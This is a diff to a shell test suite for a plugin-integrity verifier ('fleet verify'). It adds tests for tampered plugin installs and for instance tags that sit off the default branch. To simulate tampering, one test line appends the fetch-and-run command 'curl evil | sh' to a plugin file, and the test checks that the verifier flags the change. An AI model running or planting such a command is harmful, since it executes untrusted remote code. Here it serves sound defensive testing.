@@ -74,7 +74,7 @@ case "${1:-} ${2:-}" in
     . "$FAKE/fake-github.sh"; p="${2#repos/acme/app}"; fake_github_api "$FAKE/app-origin.git" "${p#/}" ;;
   "api repos/acme/fleet/git/ref/tags/v3.4.5") IR="$(cat "$FAKE/instrepo")"; printf '{"ref":"refs/tags/v3.4.5","object":{"type":"commit","sha":"%s"}}\n' "$(git -C "$IR" rev-parse v3.4.5^{commit})" ;;
   "api repos/acme/fleet") echo '{"default_branch":"main"}' ;;
-  "api repos/acme/fleet/compare/"*) echo '{"status":"ahead"}' ;;
+  "api repos/acme/fleet/compare/"*) printf '{"status":"%s"}\n' "$(cat "$FAKE/inst-compare" 2>/dev/null || echo ahead)" ;;
   "api repos/acme/fleet/git/trees/"*) IR="$(cat "$FAKE/instrepo")"
     git -C "$IR" ls-tree -r v3.4.5 | awk -F'\t' '{ split($1, a, " "); printf "%s\t%s\n", a[3], $2 }' \
       | jq -R -s '{truncated: false, tree: [split("\n")[] | select(length > 0) | split("\t") | {type: "blob", sha: .[0], path: .[1]}]}' ;;
@@ -230,6 +230,7 @@ run fleet verify; rc_is "with the plants removed it passes again (.in_use/ is sk
 
 echo "== PoC A: the version label edited (review H2)"
 echo '// tampered' >>"$CACHE/.claude-plugin/hooks.json"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0-local", scope: "user", enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "an install labelled with another version is a mismatch, not 'not verified'" 1
@@ -241,19 +242,24 @@ eq "…not launched" "$(launched 'acme-mm')" "$b"
 
 echo "== PoC B: a pristine user install plus a tampered project install for PIN_DIR (review H2)"
 PRIS="$HOME/pristine"; cp -R "$E/core" "$PRIS"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "9.9.9", scope: "project", projectPath: $app, enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "a project install for PIN_DIR at another version is a mismatch" 1
 has "…naming it" "$OUT" "(project scope) is 9.9.9, not the pin 1.0.0: $CACHE"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "1.0.0", scope: "project", projectPath: $app, enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "two install paths at the pin is a mismatch" 1; has "…says so" "$OUT" "two-paths"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: "'"$PRIS"'"}, {id: "engsys@engsys", version: "9.9.9", scope: "project", projectPath: "/somewhere/else", enabled: true, installPath: $c}]'
 run fleet verify
 rc_is "a project install for another directory doesn't apply" 0
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: false, installPath: "'"$PRIS"'"}]'
 run fleet verify
 rc_is "a disabled plugin is a mismatch (no guard would load)" 1; has "…says so" "$OUT" "is not enabled"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, projectEnabled: false, installPath: "'"$PRIS"'"}]'
 run fleet verify
 rc_is "…disabled for the project too" 1
@@ -716,6 +722,7 @@ APP_START="$(git -C "$APP" rev-parse HEAD)"
 pinpush() { commit_all "$APP" "$1"; git -C "$APP" push -q -f origin HEAD:main; git -C "$APP" fetch -q origin; }
 jq '.extraKnownMarketplaces["acme-fleet"] = {source: {source: "github", repo: "acme/fleet", ref: "v3.4.5"}} | .enabledPlugins["acme@acme-fleet"] = true' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"
 pinpush "pin acme-fleet"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
 printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
 run fleet verify
@@ -728,9 +735,32 @@ rc_is "a tampered instance-plugin file is a mismatch" 1
 has "…named" "$OUT" "modified   $ACME/bin/acme-guard"
 run fleet launch acme-mm
 rc_is "…and holds the launch" 1
+has "…naming the instance plugin as what failed (not the engsys plugin)" "$OUT" "what it loads does not match its pinned release: instance plugin acme@acme-fleet"
 cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
 run fleet verify
 rc_is "restored: passes again" 0
+# an instance tag off the default branch (ff-engsys-fleet tags release: commits that way): a warning for now, never a mismatch
+echo diverged >"$FAKE/inst-compare"
+c0="$(comments)"
+run fleet verify --alert
+rc_is "an off-main instance tag passes (exit 0)" 0
+has "…with a warning naming it, and the follow-up" "$OUT" "WARNING instance release acme@acme-fleet: v3.4.5 of acme/fleet is commit"
+has "…" "$OUT" "eric-sabe/engsys#227"
+eq "…and one info alert" "$(comments)" "$((c0 + 1))"
+run fleet verify --alert
+eq "…not repeated while it stays the same" "$(comments)" "$((c0 + 1))"
+printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
+run fleet verify
+rc_is "…but a modified instance file is still a mismatch" 1
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
+echo ahead >"$FAKE/inst-compare"
+run fleet verify --alert
+rc_is "back on the default branch: passes" 0
+if [ ! -e "$I/.fleet/verify-instance-offmain.alerted" ]; then ok "…and the alert latch is cleared"; else bad "…and the alert latch is cleared"; fi
+echo diverged >"$FAKE/compare-status"
+run fleet verify
+rc_is "an engsys tag off the default branch is still a mismatch" 1
+echo ahead >"$FAKE/compare-status"
 # the same, in ~/.claude (scope supervised): its install is held to the same release
 FCFG3="$T/fleet-claude3"; mkdir -p "$FCFG3"
 UCACHE3="$T/user-cache/engsys/1.0.0"; mkdir -p "$(dirname "$UCACHE3")"; cp -R "$E/core" "$UCACHE3"
@@ -751,6 +781,7 @@ plugins "$DEFAULT_PLUGINS"
 run fleet verify
 rc_is "an enabled instance plugin that isn't installed is 'not verified', never skipped" 3
 has "…named" "$OUT" "acme@acme-fleet is not installed"
+# shellcheck disable=SC2016 # jq variables, not shell
 plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
 jq '.extraKnownMarketplaces["acme-fleet"].source.ref = "main"' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"; pinpush "pin acme-fleet at main"
 run fleet verify
